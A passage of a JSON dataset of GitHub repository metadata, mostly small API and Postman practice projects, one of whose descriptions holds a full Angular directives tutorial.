    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34281627,
    "owner_login": "SerhiiY",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/34281627?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "server",
      "node",
      "database",
      "http",
      "user",
      "express",
      " express",
      "tested",
      "list",
      "course",
      "task",
      "module",
      "product",
      "were",
      "queries",
      "products",
      "write",
      "master"
    ]
  },
  {
    "id": 63832212,
    "name": "AjaxExplorer",
    "full_name": "saveenchad/AjaxExplorer",
    "description": "The Super Endpoint Explorer (SEE) app will allow the end user to craft requests to a remote end-point by filling out various form fields, send the request and show the response, and save common request configurations for later playback. The form of the tool is roughly like the Chrome Extension called Postman or an OSX HTTP exploration like Paw but obviously less polished and feature laden.",
    "fork": false,
    "created_at": "2016-07-21T03:01:18Z",
    "updated_at": "2016-07-28T03:31:07Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 9758723,
    "owner_login": "saveenchad",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/9758723?v=4",
    "pulled": 1,
    "tags": [
      "request",
      "form",
      "tool",
      "call",
      "requests",
      "user",
      "send",
      "response",
      "config",
      "play",
      "feature",
      "configuration",
      "various",
      "remote",
      "common",
      "configurations",
      "fields"
    ]
  },
  {
    "id": 157698357,
    "name": "postman-plugins",
    "full_name": "kamalaknn/postman-plugins",
    "description": null,
    "fork": false,
    "created_at": "2018-11-15T11:10:11Z",
    "updated_at": "2018-11-15T11:11:47Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 8401064,
    "owner_login": "kamalaknn",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/8401064?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 210642468,
    "name": "literate-train",
    "full_name": "elvisoliveira/literate-train",
    "description": "A programming challange in Java SpringBoot. Restful service that implements a cache based user manager.",
    "fork": false,
    "created_at": "2019-09-24T15:56:36Z",
    "updated_at": "2019-09-24T21:10:07Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 314738,
    "owner_login": "elvisoliveira",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/314738?v=4",
    "pulled": 1,
    "tags": [
      "service",
      "user",
      "based",
      "implement",
      "manage",
      "program",
      "lang",
      "programming",
      "implements",
      "manager",
      "challange"
    ]
  },
  {
    "id": 188052051,
    "name": "Fundoo",
    "full_name": "ChannaVeera/Fundoo",
    "description": "using java8 functionalitys created  using  MVC  Arch ,RestFull Api,s->{ Like User creating, Varfying user using jms for socket connection ,Api,s note& Label aswell using mongoDB ",
    "fork": false,
    "created_at": "2019-05-22T14:09:23Z",
    "updated_at": "2020-03-02T06:36:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 48204355,
    "owner_login": "ChannaVeera",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/48204355?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "user",
      "mongo",
      "function",
      "java",
      "creating",
      "connect",
      "functional",
      "functionality",
      "note",
      "connection",
      "java8",
      "swell"
    ]
  },
  {
    "id": 225567088,
    "name": "raml-to-postman",
    "full_name": "postmanlabs/raml-to-postman",
    "description": null,
    "fork": false,
    "created_at": "2019-12-03T08:21:48Z",
    "updated_at": "2019-12-23T10:04:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10251060,
    "owner_login": "postmanlabs",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/10251060?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 207091776,
    "name": "practice-3",
    "full_name": "martynow173/practice-3",
    "description": "Just backend requests handling, use postman. Additional functionality and code refactoring: user ratings, comments, sorting based on them, many-to-many relationship between categories and products. Role system - https://github.com/spatie/laravel-permission",
    "fork": false,
    "created_at": "2019-09-08T09:47:16Z",
    "updated_at": "2019-09-16T15:06:28Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25533512,
    "owner_login": "martynow173",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/25533512?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "request",
      "requests",
      "http",
      "user",
      "based",
      "code",
      "https",
      "function",
      "functional",
      "backend",
      "rating",
      "system",
      "github",
      "laravel",
      "product",
      "between",
      "functionality",
      "handling",
      "many",
      "actor",
      "products",
      "sort",
      "comments",
      "relationship"
    ]
  },
  {
    "id": 161702588,
    "name": "flight-api",
    "full_name": "omarabdeljelil/flight-api",
    "description": "Flight API (created with laravel 5.7) all the HTTP requests are tested with Postman/fiddler. it includes data validation and require user's Token validation for PUT,POST and DELETE requests",
    "fork": false,
    "created_at": "2018-12-13T22:32:39Z",
    "updated_at": "2018-12-15T18:42:45Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 24657418,
    "owner_login": "omarabdeljelil",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/24657418?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "data",
      "request",
      "requests",
      "user",
      "tested",
      "laravel",
      "light",
      "includes",
      "validation",
      "require",
      "fiddler"
    ]
  },
  {
    "id": 223620810,
    "name": "Fiddler2Postman",
    "full_name": "liyinchigithub/Fiddler2Postman",
    "description": null,
    "fork": false,
    "created_at": "2019-11-23T16:38:07Z",
    "updated_at": "2019-11-23T16:38:07Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 19643260,
    "owner_login": "liyinchigithub",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/19643260?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 130136501,
    "name": "ClassSchedulerUsingSpring",
    "full_name": "amulyachennaboyena/ClassSchedulerUsingSpring",
    "description": "University project:create an application that will change a course schedule  When an application user select the first day of class, the application needs to change the dates in course schedule automatically If a class is canceled due to inclement weather, entire dates should be updated If the class didn’t finish the topics as scheduled, contents of course, quiz and assignment schedule should be updated  You may create a separate UI for testing purposes or utilize a Tool like SoapUI or PostMan.  You will need to use the latest of:          Java 8          Spring Framework          MySQL or Maria DB",
    "fork": false,
    "created_at": "2018-04-19T00:18:13Z",
    "updated_at": "2018-05-08T22:01:01Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 35663002,
    "owner_login": "amulyachennaboyena",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/35663002?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "testing",
      "application",
      "call",
      "user",
      "auto",
      "automat",
      "sign",
      "util",
      "update",
      "course",
      "need",
      "class",
      "automatic",
      "needs",
      "automatically",
      "assignment",
      "should",
      "purposes",
      "updated",
      "latest",
      "content",
      "select",
      "schedule",
      "entire",
      "weather",
      "contents"
    ]
  },
  {
    "id": 130367620,
    "name": "classScheduler",
    "full_name": "AmulyaChen/classScheduler",
    "description": "University project:create an application that will change a course schedule  When an application user select the first day of class, the application needs to change the dates in course schedule automatically If a class is canceled due to inclement weather, entire dates should be updated If the class didn’t finish the topics as scheduled, contents of course, quiz and assignment schedule should be updated  You may create a separate UI for testing purposes or utilize a Tool like SoapUI or PostMan.  You will need to use the latest of:          Java 8          Spring Framework          MySQL or Maria DB",
    "fork": false,
    "created_at": "2018-04-20T13:43:16Z",
    "updated_at": "2018-04-20T13:43:16Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 38562529,
    "owner_login": "AmulyaChen",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/38562529?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "testing",
      "application",
      "call",
      "user",
      "auto",
      "automat",
      "sign",
      "util",
      "update",
      "course",
      "need",
      "class",
      "automatic",
      "needs",
      "automatically",
      "assignment",
      "should",
      "purposes",
      "updated",
      "latest",
      "content",
      "select",
      "schedule",
      "entire",
      "weather",
      "contents"
    ]
  },
  {
    "id": 76744352,
    "name": "Basic-Authentication-Node.js",
    "full_name": "divyanshu-rawat/Basic-Authentication-Node.js",
    "description": "An application that uses cookies and Express sessions approaches to track authenticated users.",
    "fork": false,
    "created_at": "2016-12-17T20:06:25Z",
    "updated_at": "2017-06-20T19:13:18Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13464678,
    "owner_login": "divyanshu-rawat",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/13464678?v=4",
    "pulled": 1,
    "tags": [
      "application",
      "user",
      "auth",
      "users",
      "uses",
      "track",
      "authenticate",
      "sessions",
      "authenticated",
      "cookies"
    ]
  },
  {
    "id": 112301483,
    "name": "Node_TODO-Api",
    "full_name": "AlwarKrish/Node_TODO-Api",
    "description": "A simple application that integrates todo lists with users demonstrating mongodb integration with Node.js. The application was tested using postman.",
    "fork": false,
    "created_at": "2017-11-28T07:29:46Z",
    "updated_at": "2017-12-14T05:07:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29711689,
    "owner_login": "AlwarKrish",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/29711689?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "application",
      "user",
      "mongo",
      "tested",
      "demo",
      "integration",
      "list",
      "users",
      "rating",
      "mongod",
      "mongodb",
      "integrate",
      "todo",
      "demonstrating",
      "lists",
      "integrates"
    ]
  },
  {
    "id": 181634471,
    "name": "node-todo-api",
    "full_name": "ai-zubair/node-todo-api",
    "description": "An express-based API for a per-user todo-app experience.",
    "fork": false,
    "created_at": "2019-04-16T07:08:12Z",
    "updated_at": "2019-05-02T18:38:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28255043,
    "owner_login": "ai-zubair",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/28255043?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "based",
      "express",
      " express",
      "todo"
    ]
  },
  {
    "id": 125977872,
    "name": "crud-user-car",
    "full_name": "dariogguillen/crud-user-car",
    "description": "crud-api-user-car",
    "fork": false,
    "created_at": "2018-03-20T07:30:14Z",
    "updated_at": "2018-03-20T07:34:43Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 30011351,
    "owner_login": "dariogguillen",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/30011351?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "crud"
    ]
  },
  {
    "id": 210008069,
    "name": "nodeapp",
    "full_name": "treetrunkz/nodeapp",
    "description": "This is a nodejs application. It is a todo list that can be accessed and created by multiple users. The API is accessed by Postman. The server and interface is set up to POST and GET dynamically. To populate node_modules `npm install ejs, express, mongoose, body-parser --save -g` + tsc -w",
    "fork": false,
    "created_at": "2019-09-21T15:24:15Z",
    "updated_at": "2019-09-22T14:09:04Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 44754821,
    "owner_login": "treetrunkz",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/44754821?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "application",
      "server",
      "call",
      "node",
      "user",
      "express",
      "mongo",
      " express",
      "list",
      "users",
      "face",
      "access",
      "module",
      "interface",
      "nodejs",
      "esse",
      "multiple",
      "mongoose",
      "install",
      "parse",
      "todo",
      "parser",
      "dynamic",
      "modules",
      "dynamically",
      "accessed"
    ]
  },
  {
    "id": 187546007,
    "name": "Task-Manager-API",
    "full_name": "jjian4/Task-Manager-API",
    "description": "Create, read, update, delete users and tasks. Uses web tokens for account authentication. Built using Node.js, Express.js, and MongoDB/Mongoose. Used Postman for testing.",
    "fork": false,
    "created_at": "2019-05-20T01:07:05Z",
    "updated_at": "2019-05-23T02:59:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 39073669,
    "owner_login": "jjian4",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/39073669?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "user",
      "auth",
      "read",
      "authentication",
      "users",
      "update",
      "delete",
      "task",
      "token",
      "account",
      "tasks",
      "tokens"
    ]
  },
  {
    "id": 169577059,
    "name": "project-back-end",
    "full_name": "skhetarpaul/project-back-end",
    "description": "This is a server side project using Node and Express.js. The purpose is to provide its users a functionality to search some best restaurants sorted and arranged according to their star ratings. Screenshots of working back end system has been uploaded to *project_postman_results* directory in the root folder here.",
    "fork": false,
    "created_at": "2019-02-07T13:35:57Z",
    "updated_at": "2020-01-18T07:42:30Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 38581265,
    "owner_login": "skhetarpaul",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/38581265?v=4",
    "pulled": 1,
    "tags": [
      "rest",
      "server",
      "user",
      "function",
      "load",
      "star",
      "users",
      "functional",
      "rating",
      "provide",
      "system",
      "working",
      "side",
      "search",
      "result",
      "results",
      "folder",
      "functionality",
      "upload",
      "been",
      "according",
      "sort",
      "best",
      "directory",
      "back end",
      "restaurant",
      "arranged",
      "restaurants"
    ]
  },
  {
    "id": 230839273,
    "name": "FitnessTracker",
    "full_name": "aking27/FitnessTracker",
    "description": "I used React Native to create a fitness tracker mobile application for iOS and Android. In order to update and maintain server data, I used a combination of the RESTful API and Postman. Additionally, the Expo framework and Node.js were used to build the application on my machine. This app allows users to sign into their account to log exercise/nutritional information, create fitness goals, and view their progress. ",
    "fork": false,
    "created_at": "2019-12-30T03:16:39Z",
    "updated_at": "2020-02-10T03:28:33Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26031938,
    "owner_login": "aking27",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26031938?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "data",
      "form",
      "application",
      "server",
      "user",
      "sign",
      "format",
      "framework",
      "build",
      "users",
      "update",
      "view",
      "info",
      "infor",
      "allows",
      "information",
      "main",
      "were",
      "track",
      "account",
      "order",
      "mobile",
      "machine",
      "progress",
      "exercise",
      "goal",
      "tracker",
      "nutritional",
      "goals"
    ]
  },
  {
    "id": 142746863,
    "name": "My_first_cryptocurrency",
    "full_name": "HP213/My_first_cryptocurrency",
    "description": "Using Blockchain, I made my first cryptocurrency, I suggest using postman for better understanding. Baiscally we made an decentralized system of transferring cryptocurrency. It is runnig locally on http://127.0.0.1:5001/ you can chage port according to requirement and new user. Post request is made to add transactions and create a new node and get request to block new mine and get chain. Everything mentioned in code with comments, we have made three ports http://127.0.0.1:5002/, http://127.0.0.1:5003/, http://127.0.0.1:5004/, to show connections between three miners \"A\" \"B\" and \"C\". You can make more  ",
    "fork": false,
    "created_at": "2018-07-29T09:17:12Z",
    "updated_at": "2018-07-29T09:18:44Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34127674,
    "owner_login": "HP213",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/34127674?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "create",
      "request",
      "call",
      "node",
      "http",
      "user",
      "code",
      "local",
      "more",
      "connect",
      "very",
      "system",
      "action",
      "chai",
      "currency",
      "between",
      "under",
      "crypto",
      "require",
      "connection",
      "according",
      "locally",
      "comments",
      "mine",
      "three",
      "better",
      "transactions",
      "understanding",
      "cryptocurrency",
      "suggest"
    ]
  },
  {
    "id": 40326550,
    "name": "Angular-Directive-Project",
    "full_name": "sn0112358/Angular-Directive-Project",
    "description": "Angular-Directive-Project Directives range from very basic to extremely complex. This project will build up to some somewhat difficult directives. Keep in mind that the format we're learning for directives is the same format used to build some extremely complex things in angular. Using directives often and well is one way to show you're a talented developer.  Starting Out  We've included only a few things for you to begin with. index.html, app.js, styles.css. At this point the best way to get more comfortable with angular is to initialize an app without relying heavily on boilerplate code (reusable code that starts out your projects for you).  You'll notice that in the index.html we've included the angular-route CDN. Yes, we'll be using angular's router here. Put an ng-view into your index.html.  In your app.js set up a config and set up our first route for when a user is at the '/home' url. If you're having trouble remembering how to set up the router go look at how you set up the router on the previous project. One way these projects will be beneficial to you is allowing you to look back at something *you** did and seeing how you got that something to work.* You may also want add an otherwise that defaults to /home. Create a controller and a template file for this route in your app folder. Don't forget to include the controller as a script in your index.html Check that everything is hooked up correctly. Try adding a div with some text in your home template just to make sure it's showing up. Once you've got that going you're ready to start on some directives. Now let's make our directive. We'll start with a simple one that we can use to display information passed to it.  Step 1. Start your directive  Woot. When you're initializing your directive just remember that it works very similarly to how you start up a controller or a service. It can also be very helpful to think of your directive as a route.  Create your directive. You'll use the directive method on your angular module. It takes two arguments, the name string and the callback function, which will return the object that represents your directive. When naming your directive give it a name with two words; dirDisplay would be nice, but anything works. Just remember it's best practice to give a directive a camel case name so that it's clear in your html what it is. Also we're going to need a template html for our directive. We could do it inline, but let's make another file instead. Just name it something that makes sense for the name of your directive and put it in the same directory as your directive file. For your template just make a  and inside a  tag that says User. Now in your home route html add in your directive. It will look like this if you named it dirDisplay:  Start up your app and go to the home route. Check and make sure you see User where your directive was placed. If you're not seeing it at this point it could mean a few things. Here's some more common issues. You didn't link your directive in your index as a script. Your name for your directive doesn't match the name in your html. Remember camel case becomes snake case so myDirective becomes . You're file path to your html template is wrong. You have to think of file paths in angular as relative to the index. Here's some code to see just for this part, and just for the directive's js file.  var app = angular.module('directivePractice'); app.directive('dirDisplay', function(){   return {     templateUrl: 'app/directives/dirDisplay.html'   }; }); What we're returning is the directive object. You won't see anymore code in this tutorial so it's important you get things working right and refer back to what you've already done to advance from now on.  Step 2. Advancing directives  Your directive should be loaded up now, but it's not really doing much. Let's make it better.  In your home controller. Make a variable on your $scope called user. Set it's value to {   name: \"Geoff McMammy\",   age: 43,   email: \"geofdude@gmail.com\" } Now inside your directive's html specifically inside the  tags display our new user's name. Then inside maybe some  tags display his email and age. This is going to work exactly the same as if it was just inside your home controller. Reload the page and make sure it works. This is still very cosmetic and really not all that useful. It needs functionality.  Add into your directive's object the link property. The link property's value is a function definition that takes (generally) three parameters. scope, element, and attributes. Unlike in other places with angular injection these parameter names don't carry meaning. The first parameter will always represent your $scope for that directive, the second will always be the element that wraps your whole directive, and the third will always be an object containing all the properties and values of the attributes on your directive in the dom. Try the following to get a feel for all three.  Add two attributes to your directive in your html. Like this -  Now in the link property you've added console.log the three parameters in the function. You'll see an object for scope that should look identical to the $scope of your html function. For element you'll see an object the represents the DOM wrapper for your directive. For attributes you'll see an object that will look like this:  {   test: \"myTest\",   myCheck: \"checkItOut\" } An important thing to notice is how it has again converted snake case to camel case for you. my-check became myCheck. Don't forget this. You'll run into this issue one day. It counts for both attributes and directive names.  To feel some of what the link function could do let's try this.  Add a ng-show to both the email and age wrappers. This should be familiar to you. Now inside your link function add a click event listener to your element property. It's going to look just like jQuery. element.on('click', function(){  }) Inside the click listener's callback add a toggle for the ng-show property you passed in. Along with a console.log to make sure things are connecting when you click. Try it out. Don't call for a mentor when it doesn't work. Let's talk about that first. You should see the console.log firing, but why isn't it toggling. This is going to be a common problem when working with the link function and event listeners. What we have here is an angular digest problem. The value is changing on the scope object, but the change isn't being reflected by our DOM. That's because angular isn't aware of the change yet. Anytime we cause an event to happen using something like jQuery or even angular's jQLite we need to let angular know that we've made a change.  Add this line of code in place of your console.log, scope.$apply(). Now try it out. It should be working now, so if you're still having issues it's time to debug. What we've done is forced angular to run it's digest cycle. This is where angular checks the scope object for changes and then applies those to the DOM. This is another good lesson to learn for later. You'll most likely hit this when making changes to your element using event listeners.  Step 3. Directive's re-usability.  Now our directive has some extremely basic functionality. One of a directive's greatest advantages though is its ability to be placed anywhere and still be functional. Let's say instead we had a list of users instead of just one.  Change the $scope property in your home controller to be users and give it this array as its value: [  {    name: \"Geoff McMammy\",    age: 43,    email: \"geofdude@gmail.com\",    city: \"Provo\"  },  {    name: \"Frederick Deeder\",    age: 26,    email: \"fredeed@gmail.com\",    city: \"Austin\"  },  {    name: \"Spencer Rentz\",    age: 35,    email: \"spencerrentz@gmail.com\",    city: \"Sacramento\"  },  {    name: \"Geddup Ngo\",    age: 43,    email: \"geddupngo@gmail.com\",    city: \"Orlando\"  },  {    name: \"Donst Opbie Leevin\",    age: 67,    email: \"gernee@gmail.com\",    city: \"Phoenix\"  } ] Now in your home HTML add a ng-repeat to the directive call. Tell it to repeat for each user in users. Reload your page. It's working! But why? How does each directive instance know what information to display?  In the link function console.log the scope parameter. Make sure it's outside of your click listener. You'll see five print outs in your console. Open up any one of them and look to the bottom. Open up the user property. It's exactly what we would want! But again why would that be the case? Don't get too caught up in this next bit if it's too hard to understand, but the ng-repeat is essentially making new tiny scope objects for each individual user in our users array. Now each of our directives is still getting a user property on the scope object just like the directive wanted in the beginning. Woot.  Step 4. Ramp it up with Isolate Scope.  Directives can do so much more. So let's make that happen. That means we should make.... a new directive!!! This directive's purpose will be to display a selected User and the weather in his/her/its location. Link it up just like the last one.  Create a js file for our directive and name it dirWeather. Make an html file named dirWeather.html. Link it up in your index.html and add the template to your new directive object. In your directive's template give it an  tag that says Weather just so we can know it's working. Above your ng-repeat on dirDisplay add your new dirWeather directive. If it's not working check the instructions above as to some common reasons why before asking a mentor for help. If you're seeing the Weather text on your page then we're ready to try out the dreaded Isolate Scope. The isolate scope object is one of the stranger API's in angular. I'm sorry but it is. Just refer to this for now.  scope: {  string: '@',  link: '=',  func: '&' } The properties on the scope object represent the attributes on the directive in the html. Our example scope object here would look something like this in the html.  The hard part here is the @, =, and &. They each have very important and distinct meanings.  @ says take in my attribute value as a string. = says take in my attribute value as a two-way bound variable from the parent scope. & says take in my attribute value as a reference to a function on the parent scope. It's also critical to point out that once you add a scope object you have no isolated your directive's scope. Meaning, aside from the values passed in through attributes, this directive has no connection to the $scope of its parent.  That being said let's isolate our directive's scope. :worried:  Add the scope property to your dirWeather. Give it the value of an object with a property of currentUser whose value is '='. Remember in your html this will look like current-user. This is the third time I've said so don't expect it again. This means that whatever comes into the currentUser attribute is going to be a value of the parent's scope object.  For now test this out by passing in users[0]. Find a way to show that users information inside your dirWeather's html. Remember inside your directive now the user is represented by currentUser. Step 5. &? &!?  The '=' value on your scope object has created a two-way binding between users[0] and currentUser. Now let's try out the '&'.  On your home controller add a function called getWeather. It takes one parameter called city. This function will make a call to a service so we'll need to create that. Make a weather service. Name it something cool and creative like weatherService. Inside the weather service make a function called getWeather that also takes one parameter, city. Make an $http get to this url - 'http://api.openweathermap.org/data/2.5/weather?q=' After the q= add on the city parameter. If you want you can test this out in postman. See what kind of data you get back. If it's the weather of that city then... you win! Use $q to return a promise that only resolves with the data you want. Temperature (preferably not in Kelvin) and the weather description. Use console.log on the data coming from the $http request to get to what you want. You'll need to add both on an object that you resolve your new promise with. On your home controller have it return the result of invoking the get getWeather function on the service. You should be returning a promise. Now in your home route's HTML pass in the getWeather function to the dirWeather directive through an attribute called weather-call. Add the attribute to your isolate scope object. That was a lot of linking, but let's walk through it. Your controller has a function linked to the service, which is in turn linked to your directive. So if you run the weatherCall function in your directive it will go through your controller to your service and then back.  Now things get a little bit tricky. Angular's way of passing along arguments through a directive to your controller are tricky, but once you understand how to do it, it's not hard. I'm going to give an example here of how it works.   Here's how it would look in your HTML. But where's the data supposed to be coming from? It seems that you'd rather be able to pass in data from your directive. Well you still can, you just have to essentially tell angular what do use as an argument to replace data when it calls that function in your controller. The actualy function call inside the directive will look like this.  $scope.passFunc({data: wantedData}) So what you'll do is pass in an object where the property name is what the argument is named in the HTML where you call the directive. That might sound confusing, but just look at the two code blocks above for a pattern. Note that pass-func becomes $scope.passFunc and data is being replaced with wantedData with the {data: wantedData} object. In our directive we want to replace city in the attribute call, for something else inside the directive. You'll follow the same pattern as above.  For now let's get things set up for that function call.  Add to the dirWeather directive object a property called controller. It's value will be a function. Yes, this is a controller specifically for your one directive. It works the same as any other controller, except you don't give it a name. It's $scope object will only be accessible within an instance of your directive. Don't forget to inject $scope in the function.  Inside your controller function run the weatherCall function with the city property from the currentUser on your $scope. Here's where you need to make sure you've passed in a city argument in the attribute function call, and then replace that with your currentUser's city using an object with a city property. The function call should return a promise, so call .then afterward and add the data onto your $scope to display both the weather and temperature of the currentUser's city. The properties can be named whatever makes sense to you.  You may also want to find a way to get rid of all the decimal places on your temperature. Now you should have everything hooked up so it shows Geoff's data and the weather data for Provo. But is that good enough?  Step 6. Ramping up our ramp up.  Now let's change this so it shows the weather data for whichever user we select. We're going to need to use '&' again.  Make a function on the home controller that takes in a parameter and sets a property on the $scope to be that parameter. Maybe you see where this is going.  We want to get this function into our dirDisplay controller. But in order to do that we need to isolate dirDisplay's scope. This also means we need to pass in each individual user through the scope object as well.  To make it easier on ourselves, let's pass the current user from our ng-repeat into our directive through a user attribute. This way we can leave our two-way bindings as they are. Also pass our new function that sets our current user from our home controller into our directive through a setUser attribute.  You'll need to add an argument in there again. Go with user. Your scope object in dirDisplay should have two properties. setUser with the value of '&' and user with the value of '='. As before we're going to need to do some tricky stuff to get our argument back to our controller.  Call the setUser function inside our click event listener and pass in an object the sets our user argument to be the user on our directive's scope object. If you've forgotten this part go back up and take a look at how you did it before or the example in this README.  Whatever user you click on now should show up in the dirWeather directive as the current user. But we're missing one thing, we want to be able to see the weather for that user too. We'll have to do one more thing that will seem a little bit tricky at first, but it's good to learn if you don't know it already since it's actually used quite frequently.  We need to step up a change listener on our currentUser in the dirWeather directive. We'll use angular's $watch functionality. $watch is a method on your $scope that will watch for changes in a variable you give it. It works in two ways.  $scope.$watch('property', function(value){  console.log(\"When $scope.property changes its new value is: \", value) }); And  $scope.$watch(function(){  return myVar }, function(value){  console.log(\"When myVar changes its new value is: \", value); }); Remove the immediate function call that we have in there now. Maybe just comment it out for now because we'll use it in a bit. Now call the $watch method on your scope and have it watch currentUser. Either way of using $watch is fine. Have its callback run the $scope.weatherCall function just like you had it before.  One thing to note is that $scope.$watch will always run once to begin with. Since that's what we want here it's great, but just be aware of that.  If you've reached this point congratulate yourself. You've messed with some serious stuff today, namely directives. There are still a lot of things about directives that we can't possibly cover in a single project. If you like what we've done so far then you're in a good place to keep going. A developer who understands directives well can build a really clean looking code base. Just look at your home.html. It could have just two lines in it. If you're feeling good move on now to Step 7.  Step 7. Finishing touches  Try to work out these problems on your own.  There should be a way to let the user know that the weather data is loading. Something that appears while our $http request is retrieving our data. The $http request shouldn't fire on both opening and closing a user's information. A color change for the currently active user would be nicer than showing that user's info inside the dirWeather modal. Or at least less redundant. Whatever else you want. We still haven't explored transclusion and ng-transclude so give that a try if you're feeling adventurous. Just know that it's a way for deciding where to put the HTML child elements of a directive. It's cool stuff that can involve some criss-crossing of scopes.",
    "fork": false,
    "created_at": "2015-08-06T20:56:18Z",
    "updated_at": "2019-03-11T21:13:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 14,
    "watchers": 0,
    "score": 1,
    "owner_id": 13667207,
    "owner_login": "sn0112358",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/13667207?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "data",
      "request",
      "form",
      "file",
      "script",
      "service",
      "call",
      "http",
      "user",
      "develop",
      "code",
      "example",
      "contain",
      "format",
      "convert",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "function",
      "load",
      "calls",
      "spec",
      "list",
      "star",
      "read",
      "import",
      "users",
      "learn",
      "rent",
      "more",
      "plate",
      "view",
      "config",
      "start",
      "connect",
      "email",
      "very",
      "functional",
      "method",
      "struct",
      "info",
      "developer",
      "play",
      "need",
      "access",
      "name",
      "working",
      "html",
      "converte",
      "learning",
      "module",
      "check",
      "side",
      "tutorial",
      "infor",
      "long",
      "open",
      "object",
      "print",
      "ever",
      "information",
      "template",
      "case",
      "result",
      "control",
      "esse",
      "text",
      "problem",
      "practice",
      "making",
      "to do",
      "place",
      "between",
      "link",
      "under",
      "right",
      "specific",
      "showing",
      "along",
      "variable",
      "included",
      "lines",
      "getting",
      "desc",
      "within",
      "folder",
      "functionality",
      "order",
      "advance",
      "parameter",
      "following",
      "controller",
      "reference",
      "those",
      "done",
      "ready",
      "debug",
      "needs",
      "find",
      "objects",
      "repl",
      "style",
      "console",
      "useful",
      "note",
      "angular",
      "containing",
      "current",
      "should",
      "single",
      "location",
      "easier",
      "connection",
      "sets",
      "default",
      "common",
      "event",
      "connecting",
      "description",
      "display",
      "both",
      "router",
      "best",
      "words",
      "directory",
      "usable",
      "projects",
      "things",
      "another",
      "complex",
      "added",
      "being",
      "third",
      "select",
      "fire",
      "wrapper",
      "doing",
      "correct",
      "path",
      "cause",
      "while",
      "media",
      "going",
      "keep",
      "replace",
      "stuff",
      "home",
      "boiler",
      "expect",
      "issue",
      "still",
      "having",
      "instead",
      "boilerplate",
      "three",
      "definition",
      "currently",
      "adding",
      "better",
      "helpful",
      "talk",
      "little",
      "match",
      "lesson",
      "ember",
      "makes",
      "instruction",
